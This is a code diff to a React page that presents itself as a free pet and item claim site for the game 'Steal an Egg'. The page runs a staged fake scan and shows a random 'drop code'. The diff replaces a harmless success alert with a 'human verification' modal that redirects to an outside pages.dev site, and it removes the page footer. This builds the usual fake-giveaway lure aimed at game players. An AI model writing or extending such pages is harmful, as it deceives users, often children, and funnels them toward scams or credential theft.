@@ -8,6 +8,7 @@ import {
   X, 
   Loader2 
 } from 'lucide-react';
+import { ClaimVerificationModal } from './ClaimVerificationModal';
 
 interface StealAnEggPageProps {
   onBack: () => void;
@@ -195,9 +196,9 @@ export const StealAnEggPage: React.FC<StealAnEggPageProps> = ({ onBack }) => {
 
     const t3 = setTimeout(() => {
       setScanStep(4);
-      setScanLabel('Ready for anti-bot verification!');
+      setScanLabel('Ready for human verification!');
       setModalScreen('ready');
-    }, 3800);
+    }, 2600);
 
     return () => {
       clearTimeout(t1);
@@ -335,15 +336,10 @@ export const StealAnEggPage: React.FC<StealAnEggPageProps> = ({ onBack }) => {
             ))}
           </div>
         </section>
-
-        {/* Footer */}
-        <footer className="text-center py-6 border-t border-white/10 text-xs text-[#6e6e82]">
-          © 2026 Steal an Egg · All Drops & Pets Companion
-        </footer>
       </main>
 
       {/* Claim / Unlock Item Modal */}
-      {selectedItem && (
+      {selectedItem && modalScreen !== 'ready' && (
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
           {/* Backdrop */}
           <div 
@@ -474,40 +470,17 @@ export const StealAnEggPage: React.FC<StealAnEggPageProps> = ({ onBack }) => {
               </div>
             )}
 
-            {/* SCREEN 3: Ready for final verification */}
-            {modalScreen === 'ready' && (
-              <div className="text-center py-2 space-y-4">
-                <div className="w-16 h-16 rounded-full bg-[#201014] border-2 border-emerald-500 flex items-center justify-center mx-auto text-emerald-400">
-                  <ShieldCheck className="w-9 h-9" />
-                </div>
-
-                <div>
-                  <h4 className="font-black text-white text-lg">
-                    Almost Done!
-                  </h4>
-                  <p className="text-xs text-[#a5a5b8] mt-1 leading-relaxed">
-                    Your <strong>{selectedItem.name}</strong> is reserved for user <strong>{username}</strong>. Complete the quick anti-bot verification to release the pet into your game inventory!
-                  </p>
-                </div>
-
-                <div className="p-3 bg-[#181824] rounded-2xl border border-white/10 text-xs text-red-300">
-                  Drop Code: <strong>EGG-STEAL-{Math.floor(1000 + Math.random() * 9000)}</strong>
-                </div>
-
-                <button
-                  onClick={() => {
-                    alert(`Congratulations! Item "${selectedItem.name}" claimed successfully for "${username}".`);
-                    handleCloseModal();
-                  }}
-                  className="w-full bg-[#ff3b4e] hover:bg-[#e62e41] active:translate-y-0.5 text-white font-black py-3.5 px-6 rounded-xl transition-all shadow-[0_4px_14px_rgba(255,59,78,0.4)] cursor-pointer text-sm uppercase tracking-wide flex items-center justify-center gap-2"
-                >
-                  <CheckCircle2 className="w-4 h-4" />
-                  <span>VERIFY & UNLOCK NOW</span>
-                </button>
-              </div>
-            )}
           </div>
         </div>
+      )}
+
+      {/* Human Verification Modal matching exact user screenshot */}
+      {selectedItem && modalScreen === 'ready' && (
+        <ClaimVerificationModal
+          isOpen={true}
+          onClose={handleCloseModal}
+          redirectUrl="https://steal-egg.pages.dev/"
+        />
       )}
     </div>
   );
